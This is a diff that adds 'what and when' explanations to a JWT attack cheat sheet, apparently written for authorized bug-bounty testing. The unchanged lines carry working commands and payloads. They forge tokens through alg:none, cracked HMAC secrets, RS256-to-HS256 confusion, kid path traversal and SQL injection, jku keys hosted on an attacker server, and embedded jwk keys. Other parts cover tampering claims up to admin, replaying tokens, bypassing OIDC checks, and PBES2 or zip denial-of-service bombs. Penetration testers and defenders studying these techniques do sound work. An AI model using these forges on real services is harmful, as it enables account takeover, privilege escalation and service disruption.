@@ -13,6 +13,8 @@
 
 ## 0. Decode / inspect (guide §4)
 
+*What & when:* your **very first move** on any token — flip the base64url back to plain text so you can read the header (`alg`, `kid`, `jku`/`jwk`) and the claims (`sub`, `role`, `exp`). This is recon, not an attack; it tells you which section below to jump to. No key needed — decoding is always possible.
+
 ```bash
 # Pure decode, no tools:
 echo "$TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
@@ -34,6 +36,8 @@ $p = $TOKEN.Split('.')[1].Replace('-','+').Replace('_','/'); while($p.Length%4){
 
 ## 1. Baseline — is the signature verified? (guide §5)
 
+*What & when:* run this **before any clever attack** — it answers the one question that shortcuts everything: does the server even check the stamp? Tamper a claim while keeping the old signature, strip the signature, send garbage. If any of those is accepted *and behaviour changes*, you've already found the biggest bug (no forging needed).
+
 ```bash
 # A) Tamper a claim, KEEP signature (jwt_tool tamper mode):
 python3 jwt_tool.py "$TOKEN" -T          # edit role/sub interactively, resend
@@ -51,6 +55,8 @@ python3 jwt_tool.py -t "$URL" -rh "$AUTH" -M at
 
 ## 2. alg:none (guide §6)
 
+*What & when:* try when you want a **no-key forge** — the token declares "I'm unsigned; trust me," and a broken verifier obeys. Zero crypto, zero setup, so it's one of the first things to try in Phase 3. Modern libs reject it, but when it works it's Critical.
+
 ```bash
 # jwt_tool — tries none/None/NONE/nOnE with empty signature:
 python3 jwt_tool.py "$TOKEN" -X a
@@ -66,6 +72,8 @@ none   None   NONE   nOnE   NonE   nonE   "none "   none\x00
 ---
 
 ## 3. Weak HMAC secret crack (HS256/384/512) (guide §7)
+
+*What & when:* use when `alg` is **HS256/384/512** (symmetric — one shared password). Capture one token and guess the password **offline** on your own machine (default/leaked secrets first, then wordlists). Crack it and you can mint any token. Offline = quiet and safe; you never hammer the target.
 
 ```bash
 echo "$TOKEN" > token.txt
@@ -95,6 +103,8 @@ key  private  s3cr3t  CHANGE_ME  qwerty  <framework-sample-keys>  <leaked .env /
 
 ## 4. RS256 → HS256 algorithm confusion (guide §8/§9)
 
+*What & when:* use when `alg` is **RS256/PS256** (asymmetric) **and you can get the public key** (JWKS, `.well-known`, or recover it from two tokens). You flip the token to HS256 so the verifier uses the *public* key as an HMAC secret — and since it's public, you have it too. Formatting is the usual snag, so let the poc try PEM/DER variants.
+
 ```bash
 # Get the public key (PEM). From JWKS:
 curl -s https://target.com/.well-known/jwks.json | jq .
@@ -116,6 +126,8 @@ Burp JWT Editor: New HMAC key → paste the **public-key PEM** as the key → re
 ---
 
 ## 5. kid injection (guide §10)
+
+*What & when:* use when the header has a **`kid`** (key-ID label). The server pastes that label into a file path / SQL query / command to look up the key — all attacker-controlled. Point it at a known-content file (`/dev/null` → empty key → sign with `""`), or SQLi it to return a key you chose. Bonus: `kid` can be its own LFI/SQLi/RCE/SSRF bug.
 
 ```bash
 # Path traversal → empty key via /dev/null, then sign HS256 with secret "":
@@ -139,6 +151,8 @@ python3 jwt_tool.py "$TOKEN" -X i        # jwt_tool injection scan (kid/jku/jwk)
 ---
 
 ## 6. jku / x5u — attacker-hosted JWKS (+ SSRF) (guide §11)
+
+*What & when:* use when the header has **`jku`/`x5u`** (a URL the server fetches the key from). Host *your* key at a URL you control, point `jku` at it, sign with *your* private key — the server fetches your key and "verifies" you. Needs a public host (ngrok/Collaborator). Even a failed forge proves **SSRF** (the server fetched your URL).
 
 ```bash
 # 1) Generate keypair + serve a JWKS containing YOUR public key:
@@ -164,6 +178,8 @@ https://trusted.com/open-redirect?url=https://YOUR-HOST/jwks.json
 
 ## 7. jwk / x5c — embedded key (guide §12/§13)
 
+*What & when:* the **easiest key-injection to try**, so do it early. The header carries the key (`jwk`) or cert (`x5c`) *inside the token* — no hosting. Embed your own public key, sign with your private key; a verifier that trusts the embedded key accepts you. One click in Burp's JWT Editor ("Embedded JWK").
+
 ```bash
 # Embed YOUR public key in the header and sign with YOUR private key (no hosting needed):
 python3 jwt_tool.py "$TOKEN" -X i           # jwt_tool embedded-jwk
@@ -188,6 +204,8 @@ python3 jwt_tool.py "$TOKEN" -X psychic
 ---
 
 ## 9. Claim tampering quick set (guide §15/§24/§25/§26)
+
+*What & when:* once you have a working forge primitive (or the signature isn't checked), this is the menu of **what to actually change** to turn a valid token into impact — `sub` for another user, `role` for admin, `tenant` for another company. Change one at a time and confirm the server's behaviour changed.
 
 Re-sign with whatever forge primitive works (none / cracked HS / pubkey-HS / jwk). One claim at a time, watch behavior:
 ```jsonc
@@ -215,6 +233,8 @@ python3 poc/forge_token.py "$TOKEN" --alg none --claim role=admin
 
 ## 10. Lifecycle / replay tests (guide §17/§18)
 
+*What & when:* use even when the signature is rock-solid — these test whether tokens **die when they should**. Replay an expired token (is `exp` enforced?), replay a token after logout/password-change (is it revoked?), reuse a rotated refresh token. Persistent access from a token that should be dead is the payable bug.
+
 ```bash
 # exp ignored? — replay an expired (old captured) token:
 curl -s "$URL" -H "Authorization: Bearer $OLD_EXPIRED_TOKEN" -o /dev/null -w "%{http_code}\n"
@@ -228,6 +248,8 @@ curl -s "$URL" -H "Authorization: Bearer $OLD_EXPIRED_TOKEN" -o /dev/null -w "%{
 ---
 
 ## 11. Issuer/audience confusion (guide §16)
+
+*What & when:* use in multi-service / SSO / SaaS setups. No forging — you take a **genuine** token from one place (another app, staging, your own OAuth client) and **replay** it somewhere it wasn't meant to work, betting the target forgot to check `aud`/`iss`. Cross-audience acceptance is High–Critical.
 
 ```bash
 # Replay a token from another context (second app / staging / your own OAuth client) at the target:
@@ -309,6 +331,8 @@ kid: http://YOUR.oast.fun/kid-ssrf                                        → co
 ---
 
 ## 16. OIDC `id_token`-specific attacks (guide §16.1)
+
+*What & when:* use when the app is a **"Sign in with Google/Microsoft/…" relying party**. The `id_token` is the ID card the login provider issues; apps routinely skip one of its anti-fraud checks (`aud`/`azp`, `nonce`, `at_hash`/`c_hash`, `(iss,sub)` keying). Each skipped check is a clean **sign-in-as-victim**. Test with your own OIDC client + a second test account.
 ```
 □ aud as ARRAY:        header/claims  "aud": ["the-rp-client", "attacker-client"]  → RP accepts any aud in the list?
 □ azp not checked:     with multiple aud, set "azp" to a value ≠ the RP's client_id → still accepted? = confused deputy.
@@ -324,6 +348,8 @@ kid: http://YOUR.oast.fun/kid-ssrf                                        → co
 ```
 
 ## 17. JWT / JWE Denial-of-Service (only where DoS is in scope) (guide §20.1)
+
+*What & when:* **only if DoS is explicitly in scope.** These are "one tiny token, huge server work" tricks (a `p2c` bomb makes the server run 100M hashing rounds; a `zip` bomb explodes to gigabytes). Demonstrate the cost of a **single** request and the ratio — never flood production.
 ```
 □ PBES2 p2c bomb (JWE alg=PBES2-HS256+A128KW etc.):  set header "p2c": 100000000  → server runs 100M PBKDF2 rounds per
    verify → CPU hang. Demonstrate ONE request's multi-second cost; never flood.
